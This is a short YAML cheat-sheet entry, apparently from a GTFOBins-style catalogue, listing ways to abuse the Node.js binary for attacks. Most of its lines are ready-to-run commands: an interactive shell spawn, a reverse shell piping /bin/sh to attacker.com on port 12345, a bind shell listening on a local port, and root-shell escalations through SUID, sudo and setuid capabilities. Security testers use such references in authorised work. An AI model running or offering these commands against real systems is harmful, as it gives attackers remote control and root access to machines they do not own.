---
functions:
  shell:
    - code: |
        node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh");
        net.connect(process.env.RPORT, process.env.RHOST, function () {
          this.pipe(sh.stdin);
          sh.stdout.pipe(this);
          sh.stderr.pipe(this);
        });'
  bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        export LPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh");
        require("net").createServer(function (client) {
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
        }).listen(process.env.LPORT);'
  suid:
    - code: |
        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
  sudo:
    - code: |
        sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  capabilities:
    - code: |
        ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
---
